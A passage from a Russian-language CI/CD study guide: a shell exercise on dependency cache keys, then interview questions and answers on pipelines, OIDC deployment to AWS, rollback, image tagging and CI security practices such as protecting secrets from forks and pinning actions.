echo 'requests==2.32.3' > requirements.txt
key() { echo "pip-$(shasum -a 256 requirements.txt | cut -c1-12)"; }
k1=$(key)
echo "print('v2')" > app.py; k2=$(key)
echo 'boto3==1.35.0' >> requirements.txt; k3=$(key)
[ "$k1" = "$k2" ] && echo "code changed: same cache key"
[ "$k1" != "$k3" ] && echo "deps changed: new cache key"
```

Ожидаемый результат:

```text
code changed: same cache key
deps changed: new cache key
```

Разбор: ключ зависит только от lock-файла, поэтому обычные коммиты с кодом попадают в кэш и не скачивают зависимости заново, а при изменении зависимостей кэш честно пересобирается. Если ключом сделать имя ветки или номер пайплайна, кэш будет либо всегда промахиваться, либо отдавать устаревшие пакеты. Другие приёмы ускорения из раздела: `needs`, параллельные job'ы, слои Docker с зависимостями до кода, `rules:changes` для монорепо.

</details>

## Вопросы с собеседований

**Чем Continuous Delivery отличается от Continuous Deployment?**
В обоих случаях каждое изменение автоматически проверяется и готово к выкатке. При Delivery в прод выкатывают вручную по кнопке, при Deployment — автоматически, без участия человека.

**Как устроить пайплайн для монорепозитория с 10 сервисами?**
Собирать и тестировать только изменённые сервисы: в GitLab — `rules: changes` и parent-child пайплайны (у каждого сервиса свой файл); в GitHub — фильтры `paths` или action для определения изменённых путей и matrix по сервисам. Общая логика — в версионируемых шаблонах (CI/CD Components, reusable workflows). Зависимости между сервисами — через `needs`.

**Как ускорить пайплайн?**
Кэш зависимостей и слоёв Docker, параллельные задачи через `needs`, разбиение тестов, запуск только изменённого, отмена устаревших пайплайнов, shallow clone, готовые образы с инструментами, достаточное количество раннеров.

**Как деплоить в AWS без хранения ключей в CI?**
OIDC: Identity Provider в IAM, роль с trust policy, ограниченной по проекту и ветке (`sub`), задача обменивает токен CI на временные креды. Отдельные роли для разных задач (plan только чтение, apply и деплой — запись только с main).

**Чем cache отличается от artifacts?**
Cache — для ускорения, не гарантирован, переиспользуется между пайплайнами (зависимости). Artifacts — результат задачи, гарантированно передаётся следующим стадиям этого пайплайна и доступен для скачивания (бинарники, отчёты, план Terraform).

**Как не дать MR из форка украсть секреты?**
В GitLab — protected-переменные, доступные только в защищённых ветках, и одобрение запуска пайплайнов для внешних участников. В GitHub — секреты не передаются в `pull_request` из форков; не использовать `pull_request_target` с checkout и запуском кода PR; минимальные `permissions`.

**Как сделать откат?**
Артефакты неизменяемы и версионированы (тег = SHA коммита), поэтому откат — повторный деплой предыдущей версии: `helm rollback`, `kubectl rollout undo`, revert коммита в репозитории конфигурации при GitOps. Миграции БД должны быть обратно совместимыми (expand/contract), иначе откат кода сломается на новой схеме.

**Пайплайн упал на нестабильном (flaky) тесте. Что делать?**
Краткосрочно — повтор (`retry`), но только для инфраструктурных сбоев. Нестабильный тест — это баг: завести задачу, изолировать тест (карантин), найти причину (зависимость от времени, порядка, внешнего сервиса, общих данных). Иначе команда перестаёт доверять красному пайплайну.

**Как тегировать образы?**
Неизменяемые теги: SHA коммита для каждой сборки, семантическая версия по git-тегу для релизов. `latest` в проде — анти-паттерн: непонятно, что развёрнуто, и откат невозможен. Для гарантии — пиннинг по digest.

**Как организовать продвижение между окружениями?**
Один образ для всех окружений (build once). Dev — автоматически после merge, stage — автоматически или по тегу, prod — с ручным подтверждением (protected environment, required reviewers). Различия окружений — только в конфигурации (values-файлы, overlays).

**Как не допустить одновременных деплоев в одно окружение?**
`resource_group` в GitLab, `concurrency` в GitHub Actions: задачи выстраиваются в очередь.

**Что такое DAG в пайплайне?**
Граф зависимостей между задачами (`needs`): задача стартует, как только готовы её зависимости, а не когда завершится вся предыдущая стадия. Ускоряет пайплайны с независимыми ветками работы.

**Чем reusable workflow отличается от composite action?**
Reusable workflow — целые задачи со своими раннерами, вызывается на уровне задачи (`jobs.<id>.uses`). Composite action — набор шагов, выполняемый внутри задачи как один шаг (`steps[].uses`).

**Почему сторонние actions нужно пинить по SHA?**
Тег можно перенести на другой коммит. Если репозиторий action скомпрометирован, новый код выполнится в твоём пайплайне с доступом к секретам. SHA коммита неизменяем.

**Что такое script injection в GitHub Actions?**
Подстановка пользовательских данных (заголовок PR, имя ветки, текст комментария) через `${{ }}` прямо в `run`: выражение подставляется в текст скрипта до выполнения, и специально составленный заголовок выполнится как команда. Защита — передавать такие значения через `env` и использовать как переменную окружения.

**Как собирать Docker-образы в CI, работающем в Kubernetes?**
Docker-in-Docker требует privileged-контейнер (по сути root на ноде). Монтирование `docker.sock` хоста — тоже root и общий демон. Предпочтительнее сборщики без демона и без привилегий: BuildKit в rootless-режиме, Buildah.
